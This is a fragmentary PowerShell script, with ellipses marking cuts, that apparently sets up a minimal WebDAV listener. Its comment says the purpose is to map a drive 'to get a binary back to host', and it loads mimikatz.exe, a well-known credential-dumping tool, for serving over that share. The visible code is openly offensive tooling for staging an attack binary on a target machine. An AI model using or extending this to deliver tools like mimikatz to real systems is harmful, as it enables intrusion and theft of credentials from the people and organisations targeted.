...
#Just Enough WEBDAV to allow you to map drive to get a binary back to host:)
[byte[]] $File = [System.IO.File]::ReadAllBytes('C:\Tools\mimikatz.exe')
...
$webDAVLOCKResponse = '<?xml version="1.0" encoding="utf-8" ?>
<d:prop xmlns:d="DAV:">
  <d:lockdiscovery>
    <d:activelock>
      ...
      <d:owner>
        <d:href>'+$Server+'/drive/file</d:href>
      </d:owner>
...
while ($true) {
	...
	if (($request.Url -match '/drive$') -and ($request.HttpMethod -eq "OPTIONS") ){  
		$response.AddHeader("Allow", "Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK, PUT, PROPPATCH")
		$response.Close()
		continue
